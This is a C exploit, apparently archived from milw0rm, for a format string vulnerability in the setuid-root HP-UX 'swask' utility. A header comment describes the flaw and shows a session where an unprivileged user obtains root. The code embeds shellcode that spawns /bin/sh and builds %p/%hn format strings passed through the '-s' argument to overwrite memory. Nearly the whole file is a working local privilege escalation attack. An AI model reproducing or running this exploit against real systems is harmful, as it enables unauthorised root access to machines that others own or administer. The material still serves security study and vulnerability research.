/* HP-UX swask format string local root exploit
 * ============================================
 * HP-UX 'swask' contains an exploitable format string 
 * vulnerability. The 'swask' utility is installed setuid
 * root by default. Specifically the vulnerability is in
 * the handling of the "-s" optional arguement which is
 * passed to a format function as verbatim.  
 *
 * Example.
 * $ uname -a
 * HP-UX hpux B.11.11 U 9000/785 2012383315 unlimited-user license
 * $ id
 * uid=102(user) gid=20(users)
 * $ ./prdelka-vs-HPUX-swask
 * [ HP-UX 11i 'swask' local root exploit
 * =======  01/20/06 10:19:49 EST  BEGIN swask SESSION (non-interactive)
 * <SNIP>
 * 
 * =======  01/20/06 10:19:50 EST  END swask SESSION (non-interactive)
 * 
 * $ id
 * uid=0(root) gid=3(sys) euid=102(user) egid=20(users)
 * $
 *
 * - prdelka
 */

char shellcode[]=
		 "\xeb\x5f\x1f\xfd\x0b\x39\x02\x99\xb7\x5a\x40\x22"
		 "\x0f\x40\x12\x0e\x20\x20\x08\x01\xe4\x20\xe0\x08"
		 "\xb4\x16\x70\x16""/bin/sh";

int main(){
        char *d, *c, *b,*a,*envp;
        int i,pid;
	printf("[ HP-UX 11i 'swask' local root exploit\n");
	switch(pid = fork()){
		case -1:
			perror("fork");
		case 0:
	        	a=(char*)malloc(2048);
        		memset(a,0,2048); 
        		sprintf(a,"AAAAA%c%c%c%c",0x7a,0xec,0x44,0x38); 
        		for(i=0;i<103;i++) strcat(a,"%p");
			envp=0;
			execle("/usr/sbin/swask","swask","-s",a,0,envp);
			break;
		default:
			sleep(1);
			b=(char*)malloc(2048);
        		memset(b,0,2048);
        		for(i=0;i<102;i++) strcat(b,"%p");
			strcat(b,"%31799u%hn");
			a=(char*)malloc(2048);
			memset(a,0,2048);
			d=a;
			for(i=0;i<39;i++)strcat(a,"A");
			d+=39;
			for(i=0;i<strlen(shellcode);i++) *d++=shellcode[i];
			envp=0;
			execle("/usr/sbin/swask","swask","-s",a,"-s",b,0,envp);
	}
}

// milw0rm.com [2006-10-24]
